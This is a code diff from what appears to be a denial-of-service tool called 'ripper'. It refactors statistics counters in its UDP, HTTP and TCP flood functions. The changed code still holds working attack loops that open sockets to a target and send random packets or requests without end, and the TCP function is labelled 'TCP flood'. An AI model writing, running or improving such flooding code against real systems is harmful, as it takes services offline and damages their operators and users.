@@ -5,7 +5,6 @@ import threading
 from os import urandom as randbytes
 import ripper.services
 from ripper.context import Context
-from ripper.statistics import show_statistics
 from ripper.common import get_random_string, get_server_ip_error_msg
 
 
@@ -31,19 +30,17 @@ def down_it_udp(_ctx: Context) -> None:
         except:
             _ctx.sock_manager.close_udp_socket()
         else:
+            _ctx.Statistic.udp.packets_sent += 1
+            _ctx.Statistic.udp.packets_sent_bytes += len(packet)
             if get_server_ip_error_msg in _ctx.errors:
                 _ctx.errors.remove(str(get_server_ip_error_msg))
-            _ctx.packets_sent += 1
 
         i += 1
         if i == 100:
             i = 1
-            if not _ctx.connecting_host:
+            if not _ctx.Statistic.connect.in_progress:
                 threading.Thread(daemon=True, target=ripper.services.connect_host, args=[_ctx]).start()
                 # ripper.services.connect_host(_ctx)
-
-        if not _ctx.show_statistics:
-            show_statistics(_ctx)
 
 
 def down_it_http(_ctx: Context) -> None:
@@ -54,41 +51,36 @@ def down_it_http(_ctx: Context) -> None:
 
         try:
             res = urllib.request.urlopen(
-                urllib.request.Request(_ctx.url, headers=http_headers))
-            _ctx.http_codes_counter[res.status] += 1
+                urllib.request.Request(_ctx.get_target_url(), headers=http_headers))
+            _ctx.Statistic.http_stats[res.status] += 1
         except Exception as e:
             try:
-                _ctx.http_codes_counter[e.status] += 1
+                _ctx.Statistic.http_stats[e.status] += 1
             except:
                 pass
-            _ctx.connections_failed += 1
+            _ctx.Statistic.connect.failed += 1
         else:
-            _ctx.connections_success += 1
+            _ctx.Statistic.connect.success += 1
 
-        _ctx.packets_sent += 1
-        show_statistics(_ctx)
+        _ctx.Statistic.http.packets_sent += 1
 
 
-def down_it_tcp(_ctx: Context):
+def down_it_tcp(_ctx: Context) -> None:
     """TCP flood."""
+    bytes_to_send_len = _ctx.max_random_packet_len if _ctx.random_packet_len else 1024
+
     while True:
         try:
             sock = _ctx.sock_manager.create_tcp_socket()
             sock.connect((_ctx.host_ip, _ctx.port))
-            _ctx.connections_success += 1
+            _ctx.Statistic.connect.success += 1
             while True:
                 try:
-                    bytes_to_send_len = _ctx.max_random_packet_len if _ctx.random_packet_len else 1024
                     bytes_to_send = randbytes(_ctx.max_random_packet_len)
                     sock.send(bytes_to_send)
+                    _ctx.Statistic.tcp.packets_sent_bytes += bytes_to_send_len
                 except:
                     sock.close()
                     break
-                else:
-                    _ctx.packets_sent += bytes_to_send_len
-                    if not _ctx.show_statistics:
-                        show_statistics(_ctx)
         except:
-            _ctx.connections_failed += 1
-            if not _ctx.show_statistics:
-                show_statistics(_ctx)
+            _ctx.Statistic.connect.failed += 1
